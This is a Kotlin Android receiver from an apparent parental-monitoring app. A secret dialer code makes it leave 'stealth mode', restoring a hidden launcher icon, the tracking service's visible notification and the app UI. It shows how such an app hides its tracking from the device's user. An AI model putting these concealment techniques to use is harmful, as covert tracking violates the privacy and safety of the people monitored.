package com.parentalmonitor.child.receivers

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import com.parentalmonitor.child.MainActivity
import com.parentalmonitor.child.services.TrackingForegroundService

/**
 * Secret dial-code re-entry.
 *
 * Dialing  *#*#94123#*#*  in the phone app makes the system broadcast
 * android.provider.Telephony.SECRET_CODE with host "94123". We use it to
 * un-hide the app: clear stealth, restore the launcher icon and normal
 * notification, then open the UI.
 *
 * Note: works only while the package is enabled (non-Samsung hide keeps it
 * enabled). On Samsung — where hiding disables the whole package — the
 * receiver can't fire; the parent must use the web dashboard instead.
 */
class SecretCodeReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SECRET_CODE") return
        if (intent.data?.host != SECRET_CODE) return

        // 1. Clear stealth flag (commit = synchronous so MainActivity reads the new value).
        context.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
            .edit().putBoolean("flutter.pm_stealth_mode", false).commit()

        // 2. Restore the launcher icon.
        try {
            val pm = context.packageManager
            if (Build.MANUFACTURER.equals("samsung", ignoreCase = true)) {
                pm.setApplicationEnabledSetting(context.packageName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
            } else {
                pm.setComponentEnabledSetting(
                    ComponentName(context.packageName, "com.parentalmonitor.child.LauncherAlias"),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
            }
        } catch (_: Exception) {}

        // 3. Restore the normal (visible) notification.
        try {
            val showIntent = Intent(context, TrackingForegroundService::class.java)
                .apply { action = TrackingForegroundService.ACTION_SHOW }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(showIntent)
            } else {
                context.startService(showIntent)
            }
        } catch (_: Exception) {}

        // 4. Open the app, bypassing the stealth self-close guard.
        try {
            context.startActivity(Intent(context, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                putExtra(EXTRA_FROM_SECRET_CODE, true)
            })
        } catch (_: Exception) {}
    }

    companion object {
        const val SECRET_CODE = "94123"
        const val EXTRA_FROM_SECRET_CODE = "from_secret_code"
    }
}
